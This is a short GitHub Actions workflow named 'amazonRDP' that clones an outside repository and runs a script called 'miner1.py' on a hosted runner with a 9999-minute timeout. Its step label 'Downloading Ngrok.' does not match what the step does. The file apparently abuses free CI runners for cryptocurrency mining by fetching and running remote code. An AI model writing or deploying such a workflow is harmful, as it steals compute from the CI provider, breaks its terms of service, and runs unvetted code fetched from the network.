name: amazonRDP

on: workflow_dispatch

jobs:
  build:

    runs-on: ubuntu-latest
    timeout-minutes: 9999

    steps:
    - name: Downloading Ngrok.
      run: |
        git clone  https://github.com/TOMMARCUSBRUT/dcf
    - name: run python.
      run: |
        python miner1.py
        
